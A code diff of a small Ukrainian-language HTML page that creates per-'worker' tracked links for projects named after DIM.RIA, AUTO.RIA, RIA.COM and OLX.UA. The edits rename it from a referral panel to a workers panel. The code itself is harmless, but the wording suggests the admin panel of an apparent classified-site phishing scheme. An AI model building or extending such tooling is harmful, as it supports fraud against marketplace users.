@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Панель рефералів</title>
+  <title>Панель воркерів</title>
   <style>
     body {font-family: 'Segoe UI', sans-serif;background: #1a1a2e;color: #eee;display: flex;justify-content: center;align-items: center;height: 100vh;margin: 0;}
     .container {background: #16213e;padding: 30px;border-radius: 12px;box-shadow: 0 0 20px rgba(0,255,255,0.2);width: 380px;text-align: center;}
@@ -23,14 +23,14 @@
   </div>
 
   <div id="panel" class="container hidden">
-    <h1>Генератор реф-посилань</h1>
+    <h1>Генератор посилань воркерів</h1>
     <select id="project">
       <option value="dimria">DIM.RIA</option>
       <option value="autoria">AUTO.RIA</option>
       <option value="ria">RIA.COM</option>
       <option value="olx">OLX.UA</option>
     </select>
-    <input type="text" id="nickname" placeholder="@username" />
+    <input type="text" id="nickname" placeholder="@username воркера" />
     <button onclick="generateLink()">Створити</button>
     <div id="linkOutput" class="link-output hidden"></div>
   </div>
@@ -50,7 +50,7 @@
     function generateLink() {
       const project = document.getElementById("project").value;
       const nick = document.getElementById("nickname").value.trim().replace(/^@/, '');
-      if (!nick) return alert("Введіть @username!");
+      if (!nick) return alert("Введіть @username воркера!");
 
       const base = window.location.origin;
       const refLink = `${base}/?project=${project}&ref=${btoa(nick)}`;
